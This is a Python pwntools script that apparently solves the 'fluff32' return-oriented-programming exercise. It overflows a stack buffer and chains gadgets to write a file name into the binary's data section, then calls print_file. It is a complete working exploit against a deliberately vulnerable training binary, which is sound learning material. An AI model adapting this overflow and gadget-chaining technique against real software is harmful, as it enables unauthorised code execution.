from pwn import *
from maskgen import maskfinder 


exe = context.binary = ELF("fluff32",checksec=False)
context.log_level = 'info'

overflow_offset = 44

xchg_ecx_edx_gadget = 0x08048555
pop_exc_bswap_ecx_gadget = 0x08048558   #pops into ecx and reverses byte order
complicated_pext_gadget = 0x08048543
pop_ebp_gadget = 0x080485bb
data_section_addr = 0x0804a018
print_file = 0x80483d0

hex_mask = maskfinder()
print("in hex: ", '[%s]' % ', '.join(map(str, hex_mask)))

xploit = b''
for offset,mask in enumerate(hex_mask):
    # print(type(mask))
    xploit += pack(pop_ebp_gadget)
    # xploit += pack(hex(int(mask,16)))
    # hex_val = hex(int(mask,16))
    # print(type(hex_val))
    xploit += pack(int(mask,16))
    xploit += pack(complicated_pext_gadget)
    xploit += pack(pop_exc_bswap_ecx_gadget)
    xploit += pack(data_section_addr + offset, endian='big')
    xploit += pack(xchg_ecx_edx_gadget)

payload = flat(
    asm('nop') * overflow_offset,
    xploit,
    print_file,
    0x0,
    data_section_addr
)

p = process()
p.clean()
p.sendline(payload)
p.interactive()
